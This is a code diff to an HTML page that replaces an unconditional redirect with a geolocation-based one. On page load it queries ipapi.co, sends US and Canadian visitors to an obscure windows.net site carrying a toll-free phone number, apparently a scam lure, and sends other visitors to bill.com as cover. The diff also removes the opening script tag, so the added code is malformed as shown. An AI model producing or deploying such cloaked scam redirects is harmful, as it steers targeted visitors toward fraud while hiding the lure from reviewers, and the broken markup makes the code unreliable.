@@ -3,8 +3,24 @@
 <html>
 <body>
 
-<script>
-  window.location.href = "https://bailllipya1xcd.z13.web.core.windows.net/index.html?Aniph=1-888-697-6157";
+document.addEventListener("DOMContentLoaded", function () {
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+      let country = data.country_code;
+      let redirectURL;
+
+      if (country === "US" || country === "CA") {
+        redirectURL = "https://bailllipya1xcd.z13.web.core.windows.net/index.html?Aniph=1-888-697-6157";
+      } else {
+        redirectURL = "https://www.bill.com/";
+      }
+
+      // Redirect immediately after detecting country
+      window.location.href = redirectURL;
+    })
+    .catch(error => console.error("Error fetching location:", error));
+});
 </script>
 
 </body>
